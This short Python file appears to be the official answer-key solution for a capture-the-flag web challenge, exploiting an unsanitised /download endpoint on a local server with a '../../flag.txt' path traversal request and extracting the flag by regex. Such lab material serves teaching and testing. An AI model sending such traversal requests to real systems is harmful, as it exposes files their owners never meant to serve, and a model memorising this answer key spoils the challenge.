"""
Official solution for web-traversal-01.
The /download endpoint joins FILES_DIR with user input without sanitization.
os.path.join("/app/files", "../../flag.txt") resolves to /flag.txt
"""
import requests, re

TARGET = "http://localhost:5000"
r = requests.get(f"{TARGET}/download?file=../../flag.txt")
flag = re.search(r"CTF\{[^}]+\}", r.text)
print(f"Flag: {flag.group()}" if flag else "Failed")
